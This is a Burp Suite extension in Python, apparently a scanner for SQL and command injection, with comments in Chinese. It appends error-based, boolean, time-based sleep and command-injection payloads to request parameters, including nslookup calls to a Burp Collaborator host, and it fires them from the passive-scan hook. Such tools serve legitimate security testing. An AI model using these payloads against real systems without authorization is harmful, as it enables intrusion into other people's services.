#!/usr/bin/env python
# coding:utf-8
import re
import urllib2, urllib
from urlparse import urlparse
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import pickle
import random
import re
import string
import time
from fuzzywuzzy import fuzz
try:

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue,ITab
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

print("sql注入检测插件")

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("sqlinjetion")
        callbacks.registerScannerCheck(self)
    def doPassiveScan(self,messageInfo): # 被动检测
        
        '''
        请求包的信息
        httpService = messageInfo.getHttpService()
        port = httpService.getPort()
        host = httpService.getHost()
        '''
        # 获取请求的数据包
        resquest = messageInfo.getRequest() 
        analyzedRequest = self._helpers.analyzeRequest(resquest) 
        request_header = analyzedRequest.getHeaders()
        #获取响应的数据包
        response = messageInfo.getResponse()
        analyzedResponse = self._helpers.analyzeResponse(response) 
        first_response_bodys = response[analyzedResponse.getBodyOffset():].tostring() #最新完整的响应数据包

        #判断是不是静态文件
        if not re.search("\/.*?\.js(\?|\s)",request_header[0])  and    not re.search("\/.*?\.(css|jpg|png|mp4|avi|ico|gif|pdf|jpeg|bm4|mp3|rmvb|txt)",request_header[0]) or not first_response_bodys:
            #self.do_xss(messageInfo)
            sqli_status=self.do_sqli(messageInfo,urllib.quote(first_response_bodys))
            print('sqli_status',sqli_status)
            if sqli_status:#判断是否存在注入，如果存在注入，就不行命令注入的检测了
                return 
            else:
                self.do_code_exec(messageInfo)
           # self.doRailsScan(messageInfo)
        else:
            return
    def do_error_sqli(self,messageInfo):
        httpService = messageInfo.getHttpService()
        if self._helpers.analyzeRequest(messageInfo.getRequest()).getMethod() == 'GET':
            method = IParameter.PARAM_URL
        else:
            method = IParameter.PARAM_BODY
        SQL_ERRORS_STR = (
        (r'System\.Data\.OleDb\.OleDbException', 'mssql'),
        (r'\[SQL Server\]', 'mssql'),
        (r'\[Microsoft\]\[ODBC SQL Server Driver\]', 'mssql'),
        (r'\[SQLServer JDBC Driver\]', 'mssql'),
        (r's12348569789asd145236as4d56as', 'mssql'),
        (r'System\.Data\.SqlClient\.SqlException', 'mssql'),
        (r'Unclosed quotation mark after the character string', 'mssql'),
        (r"\'80040e14\'", 'mssql'),
        (r'mssql_query\(\)', 'mssql'),
        (r'odbc_exec\(\)', 'mssql'),
        (r'Microsoft OLE DB Provider for ODBC Drivers', 'mssql'),
        (r'Microsoft OLE DB Provider for SQL Server', 'mssql'),
        (r'Incorrect syntax near', 'mssql'),
        (r'Sintaxis incorrecta cerca de', 'mssql'),
        (r'Syntax error in string in query expression', 'mssql'),
        (r'ADODB\.Field \(0x800A0BCD\)\<br\>', 'mssql'),
        (r"ADODB\.Recordset'", 'mssql'),
        (r"Unclosed quotation mark before the character string", 'mssql'),
        (r"\'80040e07\'", 'mssql'),
        (r'Microsoft SQL Native Client error', 'mssql'),
        (r'SQL Server Native Client', 'mssql'),
        (r'Invalid SQL statement', 'mssql'),
        (r'SQLCODE', 'db2'),
        (r'DB2 SQL error\:', 'db2'),
        (r'SQLSTATE', 'db2'),
        (r'\[CLI Driver\]', 'db2'),
        (r'\[DB2\/6000\]', 'db2'),
        (r"Sybase message:", 'sybase'),
        (r"Sybase Driver", 'sybase'),
        (r"\[SYBASE\]", 'sybase'),
        (r'Syntax error in query expression', 'access'),
        (r'Data type mismatch in criteria expression.', 'access'),
        (r'Microsoft JET Database Engine', 'access'),
        (r'\[Microsoft\]\[ODBC Microsoft Access Driver\]', 'access'),
        (r'Microsoft OLE DB Provider for Oracle', 'oracle'),
        (r'wrong number or types', 'oracle'),
        (r'PostgreSQL query failed:', 'POSTGRE'),
        (r'supplied argument is not a valid PostgreSQL result', 'POSTGRE'),
        (r'unterminated quoted string at or near', 'POSTGRE'),
        (r'pg_query\(\) \[\:', 'POSTGRE'),
        (r'pg_exec\(\) \[\:', 'POSTGRE'),
        (r'supplied argument is not a valid MySQL', 'mysql'),
        (r'Column count doesn\'t match value count at row', 'mysql'),
        (r'mysql_fetch_array\(\)', 'mysql'),
        (r'mysql_', 'mysql'),
        (r'on MySQL result index', 'mysql'),
        (r'You have an error in your SQL syntax;', 'mysql'),
        (r'You have an error in your SQL syntax near', 'mysql'),
        (r'MySQL server version for the right syntax to use', 'mysql'),
        (r'Division by zero in', 'mysql'),
        (r'not a valid MySQL result', 'mysql'),
        (r'\[MySQL\]\[ODBC', 'mysql'),
        (r"Column count doesn\'t match", 'mysql'),
        (r"the used select statements have different number of columns",'mysql'),
        (r"DBD\:\:mysql\:\:st execute failed", 'mysql'),
        (r"DBD\:\:mysql\:\:db do failed:", 'mysql'),
        (r'com\.informix\.jdbc', 'informix'),
        (r'Dynamic Page Generation Error:', 'informix'),
        (r'An illegal character has been found in the statement','informix'),
        (r'\[Informix\]', 'informix'),
        (r'\<b\>Warning\<\/b\>:  ibase_', 'dbms.INTERBASE'),
        (r'Dynamic SQL Error', 'dbms.INTERBASE'),
        (r'\[DM_QUERY_E_SYNTAX\]', 'dbms.DMLDATABASE'),
        (r'has occurred in the vicinity of:', 'dbms.DMLDATABASE'),
        (r'A Parser Error \(syntax error\)', 'dbms.DMLDATABASE'),
        (r'java\.sql\.SQLException', 'dbms.JAVA'),
        (r'Unexpected end of command in statement', 'dbms.JAVA'),
        (r'\[Macromedia\]\[SQLServer JDBC Driver\]', 'mssql'),
        (r'could not prepare statement', 'dbms.SQLITE'),
        (r'Unknown column', 'dbms.UNKNOWN'),
        (r'where clause', 'dbms.UNKNOWN'),
        (r'SqlServer', 'dbms.UNKNOWN'),
        (r'syntax error', 'dbms.UNKNOWN'),
        (r'Microsoft OLE DB Provider','dbms.UNKNOWN')
        )

        parameters = self._helpers.analyzeRequest(messageInfo.getRequest()).getParameters()
        for parameter in parameters:
            if parameter.getType() in [0, 1]:
                newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                payload=parameter.getValue()+'鎈\'鎈"\\'
                print(payload)
                newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url

                new_response = attack.getResponse()
                new_analyzedResponse = self._helpers.analyzeResponse(new_response) 
                new_response_bodys = new_response[new_analyzedResponse.getBodyOffset():].tostring() 
                for x in  SQL_ERRORS_STR:
                    
                    if re.search(x[0],new_response_bodys.encode('unicode-escape'),re.I):
                        print '找到一枚注入，使用正则表达式匹配到了%s，使用了%s数据库' % (x[0],x[1])
                        print "sqli##############################################################sqli"
                        issue=CustomScanIssue(httpService, url,
                                                               [attack],
                                                               'SQL injection',
                                                             'payload is %s,database is %s' % (payload,x[1]),
                                                              'Certain', 'High')
                        self._callbacks.addScanIssue(issue)
                        return True
                    else:
                        pass
        return 
    def do_sqli(self,messageInfo,first_response_bodys):
        if self.do_error_sqli(messageInfo):    #判断是否存在报错注入，如果存在就不进行下一步了
            return True
        httpService = messageInfo.getHttpService()
        if self._helpers.analyzeRequest(messageInfo.getRequest()).getMethod() == 'GET':
            method = IParameter.PARAM_URL
        else:
            method = IParameter.PARAM_BODY
        _payloads=[('-1','-0'),
                    ("'''","''''"),
                    ('"""','""""')]
        parameters = self._helpers.analyzeRequest(messageInfo.getRequest()).getParameters()
        for parameter in parameters:
            if parameter.getType() in [0, 1]:
                for clrf in _payloads:
                    newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                    payload=parameter.getValue()+clrf[0]
                    newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                    newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                    attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                    url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url

                    new_response = attack.getResponse()
                    new_analyzedResponse = self._helpers.analyzeResponse(new_response) 
                    new_response_bodys = new_response[new_analyzedResponse.getBodyOffset():].tostring() 
                    #resp_body = self._helpers.bytesToString(attack.getResponse()) #新发送请求的响应数据包
                    #print(new_response_bodys)
                    if fuzz.ratio(first_response_bodys,urllib.quote(new_response_bodys)) <= 96: #加入payload后如果页面相似度小于%96，那就进行下一步判断
                        #print(clrf[1])
                        newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                        payload1=parameter.getValue()+clrf[1]
                        
                        newParam1 = self._helpers.buildParameter(parameter.getName(), payload1, method) 
                        newRequest1 = self._helpers.addParameter(newRequest, newParam1) #将payload拼接到参数值中
                        attack1 = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest1)#重新发送数据
                        url = self._helpers.analyzeRequest(attack1).getUrl()#新发送数据的请求数据包的url

                        new_response = attack1.getResponse()
                        new_analyzedResponse = self._helpers.analyzeResponse(new_response) 
                        new_response_bodys = new_response[new_analyzedResponse.getBodyOffset():].tostring() 
                        #resp_body = self._helpers.bytesToString(attack.getResponse()) #新发送请求的响应数据包
                        #print(new_response_bodys)
    
                        print "payload1 is:%s,Similarity is:%s" % (payload1,fuzz.ratio(first_response_bodys,urllib.quote(new_response_bodys)))
                    
                        if fuzz.ratio(first_response_bodys,urllib.quote(new_response_bodys)) > 96: #如果相似度大于96那就证明是存在sql注入的
                            print "sqli##############################################################sqli"
                            issue=CustomScanIssue(httpService, url,
                                                               [attack],
                                                               'SQL injection',
                                                             'first payload is %s,second payload is %s' % (payload,payload1),
                                                              'Certain', 'High')
                            self._callbacks.addScanIssue(issue)
                            return True
                        else :
                            pass
                    else:
                        time.sleep(1) 
                        pass

        if self.do_time_sqli(messageInfo):
            return True
        else:
            pass

        return 
    def do_time_sqli(self,messageInfo):
        payloads=(('-(select*from(select(sleep(5)))x)','-(select*from(select(sleep(0)))x)'),
                ('"-(select*from(select(sleep(5)))x)-"','"-(select*from(select(sleep(0)))x)-"1'),
                ("'-(select*from(select(sleep(5)))x)-'","'-(select*from(select(sleep(0)))x)-'1"))
        httpService = messageInfo.getHttpService()
        if self._helpers.analyzeRequest(messageInfo.getRequest()).getMethod() == 'GET':
            method = IParameter.PARAM_URL
        else:
            method = IParameter.PARAM_BODY
        parameters = self._helpers.analyzeRequest(messageInfo.getRequest()).getParameters()
        for parameter in parameters:
            if parameter.getType() in [0, 1]:
                for clrf in payloads:
                    newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                    payload=parameter.getValue()+clrf[0]
                    newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                    newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                    start_time=time.time()
                    attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                    url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url  
                    end_time=time.time()
                    if end_time-start_time >= 5:
                        newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                        payload=parameter.getValue()+clrf[1]
                        newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                        newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                        start_time1=time.time()
                        attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                        url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url  
                        end_time1=time.time()
                        if end_time1-start_time1<=1:
                            newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                            payload=parameter.getValue()+clrf[0]
                            newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                            newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                            start_time2=time.time()
                            attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                            url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url  
                            end_time2=time.time()
                            if end_time2-start_time2>=5:
                                print "sqli##############################################################sqli"
                                issue=CustomScanIssue(httpService, url,
                                                                       [attack],
                                                                       'time SQL injection',
                                                                     'use payload is %s' % (payload),
                                                                      'Certain', 'High')
                                self._callbacks.addScanIssue(issue)
                                return True
                            else:
                                pass
                    else :
                        pass 
        return 


    def do_code_exec(self,messageInfo):
        httpService = messageInfo.getHttpService()
        if self._helpers.analyzeRequest(messageInfo.getRequest()).getMethod() == 'GET':
            method = IParameter.PARAM_URL
        else:
            method = IParameter.PARAM_BODY
        parameters = self._helpers.analyzeRequest(messageInfo.getRequest()).getParameters()
        collab = self._callbacks.createBurpCollaboratorClientContext()
        collab_payload =collab.generatePayload(True)

        payloads=[';set|set%26set;',';nslookup+'+collab_payload+'|'+'nslookup+'+collab_payload+'%26'+'nslookup+'+collab_payload+';']
        for parameter in parameters:
            if parameter.getType() in [0, 1]:
                for payload in payloads:
                    newRequest = self._helpers.removeParameter(messageInfo.getRequest(), parameter) #除去全部参数的值
                    payload=parameter.getValue()+payload
                    newParam = self._helpers.buildParameter(parameter.getName(), payload, method) 
                    newRequest = self._helpers.addParameter(newRequest, newParam) #将payload拼接到参数值中
                    attack = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), newRequest)#重新发送数据
                    url = self._helpers.analyzeRequest(attack).getUrl()#新发送数据的请求数据包的url
                    #新的请求响应数据包
                    new_response = attack.getResponse()
                    new_analyzedResponse = self._helpers.analyzeResponse(new_response) 
                    new_response_bodys = new_response[new_analyzedResponse.getBodyOffset():].tostring()
                    interactions = collab.fetchAllCollaboratorInteractions()
                    #print interactions
                    if re.search('(path=.*PATHEXT=.*|path=.*pwd=.*)',new_response_bodys.encode('unicode-escape'),re.I|re.S) or interactions:
                        print("找到命令执行一枚，恭喜发财！")
                        issue=CustomScanIssue(httpService, url,
                                               [attack],
                                               'command exec ',
                                             'use payload is %s' % (payload),
                                              'Certain', 'High')
                        self._callbacks.addScanIssue(issue)
                        return
                    else:
                        pass
                        

                    
class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)+'\n'+"payload:"+detail
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService

                    

